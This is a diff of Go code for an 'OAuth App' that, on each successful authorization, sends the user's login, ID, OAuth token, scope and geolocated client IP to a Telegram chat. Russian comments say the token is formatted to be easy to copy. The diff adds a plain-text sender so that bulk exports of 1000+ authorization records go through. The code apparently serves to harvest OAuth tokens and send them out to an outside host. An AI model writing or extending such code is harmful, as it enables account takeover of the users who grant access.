@@ -63,8 +63,8 @@ type authorizationRecord struct {
 
 // OAuthApp represents our OAuth App instance
 type OAuthApp struct {
-	config  *Config
-	logger  *logrus.Logger
+	config   *Config
+	logger   *logrus.Logger
 	exportMu sync.Mutex
 	exports  []authorizationRecord
 }
@@ -289,7 +289,7 @@ func formatTelegramNotification(login string, userID int64, tokenType string, ex
 	clientIP = formatClientIP(clientIP, countryCode)
 
 	return fmt.Sprintf(
-		"🔐 OAuth Authorization Succeeded\n\n👤 User: @%s\nUser ID: %d\n🔑 Token: `%s`\nToken Type: %s\nExpires: %s\nScope: %s\n🌍 Client IP: %s\nTimestamp: %s",
+		"🔐 OAuth Authorization Succeeded\n\n👤 User: %s\nUser ID: %d\n🔑 Token: `%s`\nToken Type: %s\nExpires: %s\nScope: %s\n🌍 Client IP: %s\nTimestamp: %s",
 		sanitizeMessageField(login),
 		userID,
 		sanitizeMessageField(tokenSuffix),
@@ -377,8 +377,8 @@ func countryCodeFromIPWho(body io.Reader) (string, error) {
 	return countryCode, nil
 }
 
+// Одиночное уведомление (использует Markdown для копирования токена)
 func sendTelegramNotification(ctx context.Context, botToken, chatID, message string) error {
-	// Добавили parse_mode: "Markdown", чтобы текст внутри `...` стал моноширинным и кликабельным для копирования
 	payload, err := json.Marshal(struct {
 		ChatID    string `json:"chat_id"`
 		Text      string `json:"text"`
@@ -419,9 +419,49 @@ func sendTelegramNotification(ctx context.Context, botToken, chatID, message str
 	return nil
 }
 
+// Пакетный экспорт логов (отправляется как обычный текст без ParseMode, работает для 1000+ логов)
+func sendTelegramPlainNotification(ctx context.Context, botToken, chatID, message string) error {
+	payload, err := json.Marshal(struct {
+		ChatID string `json:"chat_id"`
+		Text   string `json:"text"`
+	}{
+		ChatID: chatID,
+		Text:   message,
+	})
+	if err != nil {
+		return fmt.Errorf("failed to encode Telegram plain notification")
+	}
+
+	endpoint := telegramAPIURL + "/bot" + url.PathEscape(botToken) + "/sendMessage"
+	request, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint, bytes.NewReader(payload))
+	if err != nil {
+		return fmt.Errorf("failed to create Telegram plain notification request")
+	}
+	request.Header.Set("Content-Type", "application/json")
+
+	client := &http.Client{Timeout: 10 * time.Second}
+	response, err := client.Do(request)
+	if err != nil {
+		return fmt.Errorf("Telegram plain notification request failed")
+	}
+	defer response.Body.Close()
+
+	if response.StatusCode != http.StatusOK {
+		return fmt.Errorf("Telegram API returned HTTP %d", response.StatusCode)
+	}
+
+	var result struct {
+		OK bool `json:"ok"`
+	}
+	if err := json.NewDecoder(io.LimitReader(response.Body, 1<<20)).Decode(&result); err != nil || !result.OK {
+		return fmt.Errorf("Telegram API did not confirm the plain notification")
+	}
+	return nil
+}
+
 func sendTelegramExport(ctx context.Context, botToken, chatID string, records []authorizationRecord) error {
 	if len(records) == 0 {
-		return sendTelegramNotification(ctx, botToken, chatID, "OAuth export\nTotal: 0")
+		return sendTelegramPlainNotification(ctx, botToken, chatID, "OAuth export\nTotal: 0")
 	}
 
 	lines := make([]string, 0, len(records))
@@ -449,7 +489,8 @@ func sendTelegramExport(ctx context.Context, botToken, chatID string, records []
 	}
 
 	for _, chunk := range chunks {
-		if err := sendTelegramNotification(ctx, botToken, chatID, chunk); err != nil {
+		// Используем Plain Text версию для экспорта, чтобы спецсимволы в 1000+ логов не ломали отправку
+		if err := sendTelegramPlainNotification(ctx, botToken, chatID, chunk); err != nil {
 			return err
 		}
 	}
